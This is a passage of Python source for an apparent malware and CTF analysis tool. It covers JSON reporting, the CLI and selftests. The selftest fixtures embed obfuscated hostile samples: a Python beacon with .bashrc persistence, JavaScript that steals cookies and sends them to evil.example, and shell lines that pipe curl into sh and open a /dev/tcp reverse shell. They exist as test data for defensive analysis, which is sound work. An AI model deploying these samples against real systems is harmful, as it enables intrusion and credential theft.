    """Serialise ``report`` to the ``revauto/1`` JSON schema (no raw bytes)."""
    leaves = {l.id for l in _leaf_layers(report)} if report.layers else set()
    layers = []
    for l in report.layers:
        full = l.id in leaves or False
        txt = l.text
        layers.append({"id": l.id, "parent": l.parent, "depth": l.depth, "lang": l.lang, "kind": l.kind, "via": l.via,
                       "src_loc": l.src_loc, "size": len(l.data), "sha256": l.sha256, "confidence": l.confidence,
                       "notes": l.notes, "preview": "\n".join((txt or "").split("\n")[:3])[:300],
                       "text": (txt[:65536] if txt is not None and full else None),
                       "clean": l.meta.get("clean"), "meta": {k: _jsafe(v) for k, v in l.meta.items() if k in ("pyc_version", "marshal", "pickle", "binary")}})
    binary = None
    if report.binary is not None:
        binary = {k: v for k, v in report.binary.items() if not k.startswith("_")}
        fs = []
        for f in binary.get("functions", []):
            g = {k: v for k, v in f.items() if k not in ("strings", "ghidra_calls")}
            g["strings"] = [s["value"][:80] for s in f.get("strings", [])]
            fs.append(g)
        binary["functions"] = fs
        binary = _jsafe(binary)
    sc = report.scores or {"risk": {"score": 0, "band": "low"}, "obfuscation": {"score": 0, "band": "none", "layers": 0}}
    eng = {k: dataclasses.asdict(v) for k, v in report.engines.items()}
    eng["capstone"] = bool(report.metrics.get("capstone", bool(disasm.capstone)))
    return {
        "schema": "revauto/1", "target": report.target, "lane": report.lane, "lang": report.lang,
        "lang_confidence": report.lang_confidence,
        "summary": {"headline": _headline(report), "behaviours": _behaviours(report), "risk": sc["risk"],
                    "obfuscation": sc["obfuscation"], "flags": report.flags},
        "layers": layers,
        "blocks": [dataclasses.asdict(x) for x in report.blocks],
        "tells": [dataclasses.asdict(x) for x in report.tells],
        "iocs": [dataclasses.asdict(x) for x in report.iocs],
        "checkers": [dataclasses.asdict(x) for x in report.checkers],
        "binary": binary, "engines": eng, "notes": report.notes, "errors": report.errors,
    }


# ---------- CLI
USAGE = """revauto usage:
  recon.py revauto <file|-> [options]     analyze a script or binary ('-' = stdin)
  recon.py revauto engines                show detected analysis engines / helpers
  recon.py revauto selftest               run self-tests (--selftest also accepted)

options:
  --json               machine-readable report (schema revauto/1)
  --deep               full dumps: every layer, cleaned source, all strings, disasm
  --lane LANE          force lane: script | bin            (default: auto)
  --lang LANG          force script language: py | pyc | js | sh | ps1
  --max-depth N        max unwrap depth (default 8, hard cap 32; 0 = no unwrapping)
  --engine E           binary engine: auto | r2 | ghidra | none   (default: auto)
  --timeout SECS       engine timeout (default r2 120, ghidra 600)
  --flag-format REGEX  extra flag regex, e.g. 'CyberSci\\{[^}]+\\}'
  --rename             in the cleaned view, rename obfuscated identifiers (var_1, func_1...)
  --dump-layers DIR    write every unwrapped layer to DIR (new files only)

examples:
  recon.py revauto chall.py
  recon.py revauto dropper.js --deep
  recon.py revauto ./crackme --engine none --json
"""


class _UsageError(Exception):
    pass


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # type: ignore[override]
        raise _UsageError(message)


def _build_parser() -> argparse.ArgumentParser:
    p = _Parser(add_help=False, prog="revauto")
    p.add_argument("file", nargs="?")
    p.add_argument("--json", action="store_true", dest="as_json")
    p.add_argument("--deep", action="store_true")
    p.add_argument("--lane", default="auto")
    p.add_argument("--lang", default="auto")
    p.add_argument("--max-depth", type=int, default=DEFAULT_DEPTH, dest="max_depth")
    p.add_argument("--engine", default="auto")
    p.add_argument("--timeout", type=int, default=None)
    p.add_argument("--flag-format", default=None, dest="flag_format")
    p.add_argument("--rename", action="store_true")
    p.add_argument("--dump-layers", default=None, dest="dump_dir")
    return p


def _engines_report() -> str:
    which = _WHICH
    e = detect_engines(which)
    lines = ["revauto engines:"]

    def row(name: str, path: str | None, extra: str = "") -> None:
        lines.append(f"  {name:<14} {'present' if path else 'absent':<8} {path or ''} {extra}".rstrip())
    ver = ""
    if e.r2_path:
        try:
            ver = subprocess.run([e.r2_path, "-v"], capture_output=True, timeout=5, stdin=subprocess.DEVNULL).stdout.decode("utf-8", "replace").splitlines()[0][:60]
        except (OSError, subprocess.SubprocessError, IndexError):
            ver = ""
    row("r2/radare2", e.r2_path, ver)
    row("r2pipe", "importable" if e.r2pipe is not None else None)
    row("analyzeHeadless", e.ghidra_path)
    row("capstone", "importable" if e.capstone else None)
    for h in ("upx", "pycdc", "decompyle3", "uncompyle6", "js-beautify"):
        row(h, which(h), "(suggested in NEXT STEPS only; revauto never runs it)")
    return "\n".join(lines)


_EXT = {"py": "py", "js": "js", "sh": "sh", "ps1": "ps1", "pyc": "pyc.txt", "html": "html"}


def _dump_layers(report: Report, d: str, opts: Options) -> str | None:
    """Write layers to ``d`` (new files only). Returns an error string or None."""
    try:
        os.makedirs(d, exist_ok=True)
        for l in report.layers:
            ext = _EXT.get(l.lang, "bin")
            body = l.data
            if l.lang == "pyc":
                body = json.dumps(l.meta.get("marshal") or {"raw_strings": l.meta.get("raw_strings", [])}, indent=2).encode()
            with open(os.path.join(d, f"{l.id}.{ext}"), "xb") as fh:
                fh.write(body)
            if l.meta.get("clean"):
                with open(os.path.join(d, f"{l.id}.clean.py"), "xb") as fh:
                    fh.write(l.meta["clean"].encode("utf-8"))
            if l.view and l.lang == "js":
                with open(os.path.join(d, f"{l.id}.pretty.js"), "xb") as fh:
                    fh.write(l.view.encode("utf-8"))
        if opts.deep and report.lane == "binary":
            with open(os.path.join(d, "RevautoDigest.java"), "xb") as fh:
                fh.write(_GHIDRA_SCRIPT.encode("utf-8"))
    except OSError as exc:
        return f"cannot write layers to {d}: {exc}"
    return None


def run(args: list[str]) -> int:
    """CLI entry point (``recon.py revauto ...``)."""
    if not args or args[0] in ("-h", "--help") or "-h" in args or "--help" in args:
        print(USAGE)
        return 0
    if args[0] == "engines":
        print(_engines_report())
        return 0
    if args[0] in ("selftest", "--selftest"):
        return 0 if selftest() else 1
    try:
        ns = _build_parser().parse_args(args)
        if ns.file is None:
            raise _UsageError("missing file argument")
        if ns.lane not in ("auto", "script", "bin"):
            raise _UsageError("bad --lane")
        if ns.lang not in ("auto", "py", "pyc", "js", "sh", "ps1"):
            raise _UsageError("bad --lang")
        if ns.engine not in ("auto", "r2", "ghidra", "none"):
            raise _UsageError("bad --engine")
        if ns.max_depth < 0:
            raise _UsageError("--max-depth must be >= 0")
        fre = re.compile(ns.flag_format) if ns.flag_format else None
    except (_UsageError, re.error, SystemExit) as exc:
        print(f"error: {exc}", file=sys.stderr)
        print(USAGE, file=sys.stderr)
        return 2
    opts = Options(deep=ns.deep, as_json=ns.as_json, max_depth=min(ns.max_depth, HARD_DEPTH), lane=ns.lane, lang=ns.lang,
                   engine=ns.engine, timeout=ns.timeout, flag_re=fre, rename=ns.rename, dump_dir=ns.dump_dir)
    path: str | None = None
    try:
        if ns.file == "-":
            data, name = sys.stdin.buffer.read(MAX_INPUT), "<stdin>"
        else:
            path, name = ns.file, os.path.basename(ns.file)
            with open(ns.file, "rb") as fh:
                data = fh.read(MAX_INPUT)
    except OSError as exc:
        print(f"error: cannot read {ns.file}: {exc.strerror or exc}", file=sys.stderr)
        return 1
    if not data:
        print("error: empty input", file=sys.stderr)
        return 1
    if opts.lane == "bin" and detect_input(data, name)[0] != "bin":
        print("error: not an ELF/PE file", file=sys.stderr)
        return 1
    engines = detect_engines(_WHICH)
    report = analyze(data, name, opts, engines) if path is None else _analyze_path(data, name, opts, engines, path)
    rc = 0
    if opts.as_json:
        print(json.dumps(report_to_dict(report), indent=2, ensure_ascii=False, default=str))
    else:
        print(render_text(report, opts.deep))
    if report.metrics.get("engine_failed"):
        print(f"warning: requested engine unavailable or failed ({report.metrics['engine_failed']}); builtin results shown", file=sys.stderr)
        rc = 1
    if opts.dump_dir:
        err = _dump_layers(report, opts.dump_dir, opts)
        if err:
            print("error: " + err, file=sys.stderr)
            rc = 1
    return rc


def _analyze_path(data: bytes, name: str, opts: Options, engines: Engines, path: str) -> Report:
    """analyze() but hand engines the real file path (avoids a temp copy)."""
    global _CUR_PATH
    _CUR_PATH = path
    try:
        return analyze(data, name, opts, engines)
    finally:
        _CUR_PATH = None


_CUR_PATH: str | None = None


# ---------- selftest fixtures
_ST_FLAG = "flag{p4t_v4l_th3_tr0l}"


def _b64s(b: bytes) -> str:
    return base64.b64encode(b).decode()


def _fx_py() -> tuple[str, str]:
    key = [ord(c) ^ 0x42 for c in _ST_FLAG]
    final = (
        "import socket, os, base64\n"
        "import builtins; builtins.REVAUTO_CANARY = True\n"
        "C2 = 'http://10.13.37.5:8080/beacon'\n"
        f"KEY = {key!r}\n"
        "def beacon(data):\n"
        "    s = socket.socket()\n"
        "    s.connect(('10.13.37.5', 4444))\n"
        "    s.send(base64.b64encode(data))\n"
        "def persist():\n"
        "    with open(os.path.expanduser('~/.bashrc'), 'a') as f:\n"
        "        f.write('python3 /tmp/.x.py &\\n')\n"
        "def check(flag):\n"
        "    return [ord(c) ^ 0x42 for c in flag] == KEY\n"
        "if __name__ == '__main__':\n"
        "    if check(input('flag? ')):\n"
        "        beacon(b'ok'); persist()\n"
    )
    l2 = "import zlib, base64\nexec(zlib.decompress(base64.b64decode(%r)))\n" % _b64s(zlib.compress(final.encode()))
    l1 = ("_ = lambda __ : __import__('zl'+'ib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(%r))"
          % _b64s(zlib.compress(l2.encode()))[::-1])
    l0 = "exec(bytes.fromhex(%r).decode())" % l1.encode().hex()
    return l0, final


def _js_pack(src: str) -> str:
    """Reference Dean Edwards packer (selftest only)."""
    words = re.findall(r"\b\w+\b", src)
    uniq = sorted(set(words), key=lambda w: (-words.count(w), w))

    def enc(i: int, a: int = 62) -> str:
        return (enc(i // a) if i >= a else "") + _ALPH62[i % a]
    idx = {w: enc(i) for i, w in enumerate(uniq)}
    p = re.sub(r"\b\w+\b", lambda m: idx[m.group()], src)
    p = p.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
    return ("eval(function(p,a,c,k,e,d){e=function(c){return c};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+c+'\\\\b','g'),k[c]);return p}"
            "('%s',62,%d,'%s'.split('|'),0,{}))" % (p, len(uniq), "|".join(uniq)))


def _fx_js() -> tuple[str, str]:
    stage3 = "console.log('stage3');var k='CyberSci{js_p4ck3d}';"
    inner = ('var u="http://evil.example/c2";\n'
             'function steal(){var d=document.cookie;fetch(u,{method:"POST",body:btoa(d)});}\n'
             f'eval(atob("{_b64s(stage3.encode())}"));\n'
             'steal();')
    return _js_pack(inner), inner


def _build_revauto_test_elf() -> bytes:
    """Minimal ELF64: .text (lea/ptrace syscall/rdtsc/exit syscall/ret), .rodata (strings + AES S-box + SHA-256 IV)."""
    base, code_off = 0x400000, 0x78
    rodata = (b"Enter the flag: \0" + b"flag{elf_fallback_ok}\0" + b"/proc/self/status\0"
              + bytes.fromhex("637c777bf26b6fc53001672bfed7ab76") + _u32(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a))
    code_len = 24
    ro_off = code_off + code_len
    flag_va = base + ro_off + 17
    lea = b"\x48\x8d\x3d" + struct.pack("<i", flag_va - (base + code_off + 7))
    code = lea + b"\xb8\x65\x00\x00\x00" + b"\x0f\x05" + b"\x0f\x31" + b"\xb8\x3c\x00\x00\x00" + b"\x0f\x05" + b"\xc3"
    assert len(code) == code_len
    shstr = b"\0.text\0.rodata\0.shstrtab\0"
    shstr_off = ro_off + len(rodata)
    sh_off = (shstr_off + len(shstr) + 7) & ~7
    hdr = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\0" * 8
    hdr += struct.pack("<HHIQQQIHHHHHH", 2, 0x3E, 1, base + code_off, 64, sh_off, 0, 64, 56, 1, 64, 4, 3)
    ph = struct.pack("<IIQQQQQQ", 1, 5, 0, base, base, shstr_off, shstr_off, 0x1000)
    body = hdr + ph
    body += b"\0" * (code_off - len(body)) + code + rodata + shstr
    body += b"\0" * (sh_off - len(body))

    def sh(n: int, t: int, fl: int, a: int, o: int, s: int) -> bytes:
        return struct.pack("<IIQQQQIIQQ", n, t, fl, a, o, s, 0, 0, 1, 0)
    body += sh(0, 0, 0, 0, 0, 0) + sh(1, 1, 6, base + code_off, code_off, code_len)
    body += sh(7, 1, 2, base + ro_off, ro_off, len(rodata)) + sh(15, 3, 0, 0, shstr_off, len(shstr))
    return body


def _build_revauto_test_pe() -> bytes:
    """Minimal PE32+: .text (rdtsc; ret) and .rdata (KERNEL32 imports + flag string)."""
    img = bytearray(0xA00)
    img[0:2] = b"MZ"
    struct.pack_into("<I", img, 0x3C, 0x40)
    img[0x40:0x44] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", img, 0x44, 0x8664, 2, 0, 0, 0, 240, 0x22)
    opt = 0x58
    struct.pack_into("<HBBIII", img, opt, 0x20B, 14, 0, 0x200, 0x400, 0)
    struct.pack_into("<I", img, opt + 16, 0x1000)
    struct.pack_into("<Q", img, opt + 24, 0x140000000)
    struct.pack_into("<H", img, opt + 68, 3)
    struct.pack_into("<II", img, opt + 112 + 8, 0x2000, 40)
    sec = opt + 240
    img[sec:sec + 8] = b".text\0\0\0"
    struct.pack_into("<IIIIIIHHI", img, sec + 8, 0x200, 0x1000, 0x200, 0x400, 0, 0, 0, 0, 0x60000020)
    img[sec + 40:sec + 48] = b".rdata\0\0"
    struct.pack_into("<IIIIIIHHI", img, sec + 48, 0x400, 0x2000, 0x400, 0x600, 0, 0, 0, 0, 0x40000040)
    img[0x400:0x403] = b"\x0f\x31\xc3"
    r = 0x600

    def put(rva: int, b: bytes) -> None:
        img[r + rva - 0x2000:r + rva - 0x2000 + len(b)] = b
    put(0x2000, struct.pack("<IIIII", 0x2028, 0, 0, 0x2080, 0x2028))
    put(0x2028, struct.pack("<QQQ", 0x2040, 0x2060, 0))
    put(0x2040, b"\0\0IsDebuggerPresent\0")
    put(0x2060, b"\0\0VirtualAlloc\0")
    put(0x2080, b"KERNEL32.dll\0")
    put(0x20A0, b"CyberSci{pe_ok}\0")
    return bytes(img)


class _FakeR2:
    """Canned radare2 session for the selftest."""

    def __init__(self, canned: dict[str, Any]) -> None:
        self.canned = canned

    def cmdj(self, cmd: str) -> Any:
        v = self.canned.get(cmd)
        return json.loads(v) if isinstance(v, str) else v

    def cmd(self, cmd: str) -> str:
        return str(self.canned.get(cmd, ""))

    def close(self) -> None:
        return None


def _walk_no_bytes(o: Any) -> bool:
    if isinstance(o, (bytes, bytearray)):
        return False
    if isinstance(o, dict):
        return all(_walk_no_bytes(k) and _walk_no_bytes(v) for k, v in o.items())
    if isinstance(o, (list, tuple)):
        return all(_walk_no_bytes(x) for x in o)
    return True


def _run_cli(args: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        rc = run(args)
    return rc, out.getvalue(), err.getvalue()


def selftest() -> bool:
    """Run the S1-S15 acceptance checks; prints ``[PASS]``/``[FAIL]`` per check."""
    import builtins
    import marshal
    import random
    results: list[bool] = []

    def chk(name: str, fn: Callable[[], bool]) -> None:
        try:
            ok = bool(fn())
            err = ""
        except Exception as exc:  # noqa: BLE001
            ok, err = False, f" ({type(exc).__name__}: {exc})"
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}{err}")
        results.append(ok)

    def tells(r: Report) -> set[str]:
        return {t.id for t in r.tells}

    no_eng = Engines(None, None, None, capstone=bool(disasm.capstone))
    tmp = tempfile.TemporaryDirectory()
    td = tmp.name
    canary_path = "/tmp/.x.py"
    existed = os.path.exists(canary_path)

    # S1
    def s1() -> bool:
        with open(__file__, encoding="utf-8") as fh:
            tree = ast.parse(fh.read())
        bad_names = {"eval", "exec", "compile"}
        bad_chain = {("pickle", "loads"), ("pickle", "load"), ("marshal", "loads"), ("marshal", "load"), ("os", "system"), ("os", "popen")}
        bad_mods = {"socket", "urllib.request", "http.client", "requests", "ftplib", "smtplib", "telnetlib"}
        for n in ast.walk(tree):
            if isinstance(n, ast.Call):
                f = n.func
                if isinstance(f, ast.Name) and f.id in bad_names:
                    return False
                if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name) and (f.value.id, f.attr) in bad_chain:
                    return False
                if any(k.arg == "shell" and isinstance(k.value, ast.Constant) and k.value.value is True for k in n.keywords):
                    return False
            if isinstance(n, ast.Import) and any(a.name in bad_mods or a.name.split(".")[0] in {"socket", "requests", "ftplib", "smtplib", "telnetlib"} for a in n.names):
                return False
            if isinstance(n, ast.ImportFrom) and n.module and (n.module in bad_mods or n.module.split(".")[0] in {"socket", "requests", "ftplib", "smtplib", "telnetlib"}):
                return False
        return True
    chk("S1 safety lint (no dynamic exec / pickle / network imports)", s1)

    l0, final = _fx_py()
    opts_py = Options()
    rep2 = analyze(l0.encode(), "chall.py", opts_py, no_eng)

    def s2() -> bool:
        ls = rep2.layers
        L3 = [b for b in rep2.blocks if b.layer == "L3"]
        fn = {b.name: b for b in L3 if b.kind == "function"}
        mg = [b for b in L3 if b.kind == "main-guard"]
        iv = {(i.type, i.value) for i in rep2.iocs}
        tl = {(t.id, t.loc.split(":")[0]) for t in rep2.tells}
        conds = [
            len(ls) == 4 and [l.depth for l in ls] == [0, 1, 2, 3] and all(l.via == "exec" for l in ls[1:]),
            "hex" in ls[1].kind and ls[2].kind.find("reverse") < ls[2].kind.find("b64") < ls[2].kind.find("zlib") and "b64 -> zlib" in ls[3].kind,
            ls[3].text == final,
            "beacon" in fn and "NETWORK" in fn["beacon"].categories and any("10.13.37.5" in a for a in fn["beacon"].actions),
            "persist" in fn and "PERSISTENCE" in fn["persist"].categories and "FILE_WRITE" in fn["persist"].categories and any("~/.bashrc" in a for a in fn["persist"].actions),
            "check" in fn and ("COMPARE_CHECK" in fn["check"].categories or rep2.checkers),
            bool(mg) and {"check", "beacon", "persist"} <= set(mg[0].calls),
            any(b.kind == "imports" for b in L3),
            ("url", "http://10.13.37.5:8080/beacon") in iv and ("ip_port", "10.13.37.5:4444") in iv and ("path", "~/.bashrc") in iv and ("path", "/tmp/.x.py") in iv,
            any(c.candidate == _ST_FLAG and "xor 0x42" in c.method for c in rep2.checkers) and _ST_FLAG in rep2.flags,
            any(t.id == "T-DECODE-EXEC" and t.loc.startswith("L0:1") and t.severity == "high" for t in rep2.tells),
            ("T-LAMBDA-WRAPPER", "L1") in tl and "T-PERSIST" in tells(rep2) and rep2.scores["obfuscation"]["band"] == "heavy",
            "== PARTS ==" in render_text(rep2) and "beacon" in render_text(rep2) and _ST_FLAG in render_text(rep2),
        ]
        bad = [i + 1 for i, c in enumerate(conds) if not c]
        if bad:
            print(f"      S2 failing assertions: {bad}")
        return not bad
    chk("S2 layered python sample (4 layers, parts, IOCs, checker, tells)", s2)
    chk("S3 payload never executed (canary + no side file)", lambda: not hasattr(builtins, "REVAUTO_CANARY") and os.path.exists(canary_path) == existed)

    js_src, js_inner = _fx_js()

    def s4() -> bool:
        r = analyze(js_src.encode(), "d.js", Options(deep=True, flag_re=re.compile(r"CyberSci\{[^}]+\}")), no_eng)
        ls = r.layers
        steal = [b for b in r.blocks if b.kind == "function" and b.name == "steal"]
        conds = [
            len(ls) >= 3, ls[1].text == js_inner and ls[1].via == "eval-packer",
            "b64" in ls[2].kind,
            bool(steal) and "NETWORK" in steal[0].categories and "CREDENTIALS" in steal[0].categories,
            any(i.type == "url" and i.value == "http://evil.example/c2" for i in r.iocs),
            "CyberSci{js_p4ck3d}" in r.flags,
            {"T-JS-PACKED", "T-DECODE-EXEC"} <= tells(r),
        ]
        r2 = analyze(js_src.encode(), "d.js", Options(deep=True), no_eng)
        conds.append("CyberSci{js_p4ck3d}" in r2.flags)
        bad = [i + 1 for i, c in enumerate(conds) if not c]
        if bad:
            print(f"      S4 failing assertions: {bad}")
        return not bad
    chk("S4 JS eval-packed sample (unpack, atob layer, steal block, IOC, flag)", s4)

    def s5() -> bool:
        inner = ('(crontab -l; echo "* * * * * curl -s http://203.0.113.9/x | sh") | crontab -\n'
                 'bash -i >& /dev/tcp/203.0.113.9/9001 0>&1\n')
        r = analyze(f"a=ba;b=se64; echo {_b64s(inner.encode())} | $a$b -d | bash\n".encode(), "x.sh", Options(), no_eng)
        ip = [i for i in r.iocs if i.type in ("ip", "ip_port") and i.value.startswith("203.0.113.9")]
        return (len(r.layers) == 2 and r.layers[1].lang == "sh"
                and {"T-SHELL-PIPE-EXEC", "T-PERSIST", "T-DOWNLOAD-EXEC", "T-REVSHELL", "T-HARDCODED-IP"} <= tells(r)
                and any("doc" in i.tags and "private" not in i.tags for i in ip)
                and any(i.type == "url" and i.value == "http://203.0.113.9/x" for i in r.iocs))
    chk("S5 shell pipe-to-bash sample", s5)

    def s6() -> bool:
        r = analyze(b"cos\nsystem\n(S'id'\ntR.", "p.pkl", Options(), no_eng)
        t = [x for x in r.tells if x.id == "T-PICKLE-REDUCE"]
        return (r.lane == "script" and any(l.meta.get("pickle") for l in r.layers) and bool(t)
                and "os.system" in t[0].detail and "id" in t[0].detail
                and any(l.lang == "sh" and l.text == "id" for l in r.layers))
    chk("S6 pickle disassembled, never loaded", s6)

    def s7() -> bool:
        blob = marshal.dumps((lambda: "revauto_marshal_marker").__code__)
        r = analyze(f"import marshal,base64\nexec(marshal.loads(base64.b64decode({_b64s(blob)!r})))".encode(), "m.py", Options(), no_eng)
        pyc = [l for l in r.layers if l.lang == "pyc"]
        if not pyc or "T-MARSHAL" not in tells(r):
            return False
        txt = json.dumps(pyc[0].meta.get("marshal", "")) + " ".join(pyc[0].meta.get("raw_strings", []))
        return "revauto_marshal_marker" in txt and any(b.kind == "code-object" for b in r.blocks)
    chk("S7 marshal via isolated helper (code-object block)", s7)

    elf = _build_revauto_test_elf()
    rep8 = analyze(elf, "test.elf", Options(engine="auto"), no_eng)

    def s8() -> bool:
        b = rep8.binary or {}
        txt = render_text(rep8)
        hdrs = ["SUMMARY", "HEADERS", "PROTECTIONS", "ENGINE", "IMPORTS", "FUNCTIONS", "STRINGS", "CRYPTO", "ANTI-DEBUG", "SYSCALLS", "NEXT STEPS"]
        ro = next((s for s in b.get("sections", []) if s["name"] == ".rodata"), None)
        cr = {c["name"]: c for c in b.get("crypto", [])}
        fl = [s for s in b.get("strings", []) if s["value"] == "flag{elf_fallback_ok}"]
        text_sec = next((s for s in b.get("sections", []) if s["name"] == ".text"), None)
        sc = {s["name"] for s in b.get("syscalls", [])}
        r7 = analyze(disasm.build_test_elf(), "t.elf", Options(), no_eng)
        hello = [s for s in (r7.binary or {}).get("strings", []) if s["value"] == "hello ctf"]
        conds = [
            rep8.lane == "binary" and rep8.engines["r2"].status == "skipped" and rep8.engines["ghidra"].status == "not-requested" and rep8.engines["builtin"].status == "ok",
            all(f"== {h} ==" in txt for h in hdrs),
            "AES S-box" in cr and "SHA-256 IV" in cr and ro is not None and all(ro["offset"] <= cr[n]["offset"] < ro["offset"] + ro["size"] for n in ("AES S-box", "SHA-256 IV")),
            {"ptrace", "exit"} <= sc and {"T-PTRACE", "T-TIMING", "T-PROC-SELF"} <= tells(rep8),
            bool(fl) and "FLAG" in fl[0]["tags"] and any(text_sec and text_sec["offset"] <= (x["site"] - 0x400000) < text_sec["offset"] + text_sec["size"] for x in fl[0]["xrefs"]) and "flag{elf_fallback_ok}" in rep8.flags,
            any("ptrace" in " ".join(f["actions"]) for f in b.get("functions", [])),
            bool(hello) and bool(hello[0]["xrefs"]) and not r7.errors,
            json.loads(json.dumps(report_to_dict(rep8), default=str))["binary"]["format"] == "ELF64",
        ]
        bad = [i + 1 for i, c in enumerate(conds) if not c]
        if bad:
            print(f"      S8 failing assertions: {bad}; errors={rep8.errors}")
        return not bad
    chk("S8 binary fallback on test ELF (no engine)", s8)

    def s9() -> bool:
        e = detect_engines(which=lambda n: None)
        r = analyze(elf, "t.elf", Options(engine="r2"), e)
        ok = e.r2_path is None and e.ghidra_path is None and r.engines["r2"].status == "skipped" and "not found" in r.engines["r2"].reason and r.binary and r.binary["functions"]
        p = os.path.join(td, "t.elf")
        with open(p, "wb") as fh:
            fh.write(elf)
        old = globals()["_WHICH"]
        globals()["_WHICH"] = lambda n: None
        try:
            rc, out, _ = _run_cli([p, "--engine", "r2"])
            rc2, out2, _ = _run_cli([p, "--engine", "ghidra"])
        finally:
            globals()["_WHICH"] = old
        return bool(ok) and rc == 1 and "SKIPPED" in out and "== FUNCTIONS ==" in out and rc2 == 1 and "SKIPPED" in out2
    chk("S9 engine absent: explicit r2/ghidra request -> skipped, rc 1", s9)

    def s10() -> bool:
        flagva = 0x400400
        canned = {
            "aflj": [{"offset": 0x400078, "name": "main", "size": 24}, {"addr": 0x400200, "name": "sym.helper", "size": 10}],
            "iij": [{"name": "strcmp", "plt": 0x401030, "libname": "libc.so.6"}],
            "izj": [{"vaddr": flagva, "paddr": 0xa1, "string": _b64s(b"legacy_b64_string_ok")}, {"vaddr": 0x400300, "string": "plain string"}],
            "ij": {"bin": {}}, "iSj": [], "iEj": [], "isj": [],
            "/asj": [], "afij @ main": "{not json",
            f"axtj @ {flagva}": [{"from": 0x40007b, "fcn_name": "main", "type": "DATA"}],
        }
        e = Engines("/fake/r2", None, None, capstone=False, r2_backend_factory=lambda path, o: _FakeR2(canned))
        r = analyze(elf, "t.elf", Options(engine="r2"), e)
        b = r.binary or {}
        fs = {f["name"]: f for f in b.get("functions", [])}
        st = [s for s in b.get("strings", []) if s["value"] == "legacy_b64_string_ok"]
        return (r.engines["r2"].status == "ok" and fs.get("main", {}).get("source") == "r2" and fs.get("sym.helper", {}).get("source") == "r2"
                and bool(st) and any(x["site"] == 0x40007b for x in st[0]["xrefs"]) and any("invalid JSON" in n for n in r.notes) and not r.errors)
    chk("S10 r2 digest parsing via fake backend", s10)
    if _WHICH("r2") or _WHICH("radare2"):
        def s10b() -> bool:
            p = os.path.join(td, "t.elf")
            r = analyze(elf, "t.elf", Options(engine="r2", timeout=30), detect_engines(_WHICH))
            return r.engines["r2"].status in ("ok", "error")
        chk("S10b real r2 on test ELF", s10b)
    else:
        print("  [SKIP] real r2 not installed")

    def s11() -> bool:
        canned = {"program": "test.elf",
                  "functions": [{"name": "entry", "addr": 4194424, "size": 24, "thunk": False, "external": False, "calls": []},
                                {"name": "main", "addr": 4194448, "size": 64, "thunk": False, "external": False, "calls": ["strcmp"]}],
                  "imports": [{"name": "strcmp", "lib": "libc.so.6"}],
                  "strings": [{"addr": 4194560, "value": "\"flag{ghidra_ok}\"", "xrefs": [{"from": 4194452, "func": "main"}]}],
                  "decompiled": {"main": "int main(void)\n{\n  return strcmp(buf, \"flag{ghidra_ok}\");\n}\n"}}
        e = Engines(None, None, "/fake/analyzeHeadless", capstone=False, ghidra_runner=lambda path, o: canned)
        r = analyze(elf, "t.elf", Options(engine="ghidra"), e)
        b = r.binary or {}
        gm = [f for f in b.get("functions", []) if f["source"] == "ghidra"]
        need = ("class RevautoDigest extends GhidraScript", "getScriptArgs", "DecompInterface", "DefinedDataIterator", "getReferencesTo")
        return (all(n in _GHIDRA_SCRIPT for n in need) and r.engines["ghidra"].status == "ok" and len(gm) >= 2
                and "main" in b.get("decompiled", {}) and "== DECOMPILED ==" in render_text(r) and "flag{ghidra_ok}" in r.flags)
    chk("S11 ghidra script constant + canned JSON merge", s11)

    def s12() -> bool:
        d = report_to_dict(rep2)
        keys = {"schema", "target", "lane", "lang", "lang_confidence", "summary", "layers", "blocks", "tells", "iocs", "checkers", "binary", "engines", "notes", "errors"}
        return set(d) == keys and d["schema"] == "revauto/1" and _walk_no_bytes(d) and json.loads(json.dumps(d, default=str))["schema"] == "revauto/1"
    chk("S12 JSON schema revauto/1, no raw bytes", s12)

    def s13() -> bool:
        p0 = os.path.join(td, "empty")
        open(p0, "wb").close()
        rc, _o, err = _run_cli([p0])
        if rc != 1 or "Traceback" in err:
            return False
        rng = random.Random(1337)
        samples = [rng.randbytes(rng.randint(0, 4096)) for _ in range(50)]
        for fx in (l0.encode(), js_src.encode(), elf):
            samples += [fx[:k] for k in (1, 7, 23, 64, 100, len(fx) // 2, len(fx) - 1)]
        for s in samples:
            analyze(s, "fuzz", Options(), no_eng)
        bomb = "import zlib, base64\nexec(zlib.decompress(base64.b64decode(%r)))\n" % _b64s(zlib.compress(b"A" * (40 << 20), 1))
        rb = analyze(bomb.encode(), "bomb.py", Options(), no_eng)
        if not (rb.layers and max(len(l.data) for l in rb.layers) <= MAX_LAYER_OUT and "T-SIZE-CAP" in tells(rb)):
            return False
        pl = "print(1)"
        for _ in range(12):
            pl = "import base64\nexec(base64.b64decode(%r))" % _b64s(pl.encode())
        rd = analyze(pl.encode(), "deep.py", Options(), no_eng)
        r0 = analyze(pl.encode(), "deep.py", Options(max_depth=0), no_eng)
        if not (max(l.depth for l in rd.layers) == 8 and "T-DEPTH-CAP" in tells(rd) and len(r0.layers) == 1):
            return False
        cyc = "import base64\nexec(base64.b64decode(%r))\nexec(base64.b64decode(%r))\n" % (_b64s(b"print(2)\n"), _b64s(b"print(2)\n"))
        rc_ = analyze(cyc.encode(), "cyc.py", Options(), no_eng)
        return any("cycle" in n for n in rc_.notes)
    chk("S13 robustness: empty, fuzz, zip bomb, depth cap, cycle", s13)

    def s14() -> bool:
        pyp = os.path.join(td, "chall.py")
        with open(pyp, "w", encoding="utf-8") as fh:
            fh.write(l0)
        dd = os.path.join(td, "layers")
        rcj, outj, _ = _run_cli([pyp, "--json"])
        try:
            json.loads(outj)
            jok = True
        except ValueError:
            jok = False
        rc1, _, _ = _run_cli([pyp, "--dump-layers", dd])
        l3 = os.path.join(dd, "L3.py")
        content_ok = os.path.isfile(l3) and open(l3, encoding="utf-8").read() == final
        rc2, _, _ = _run_cli([pyp, "--dump-layers", dd])
        return (_run_cli([])[0] == 0 and _run_cli(["-h"])[0] == 0 and _run_cli(["--bogus"])[0] == 2
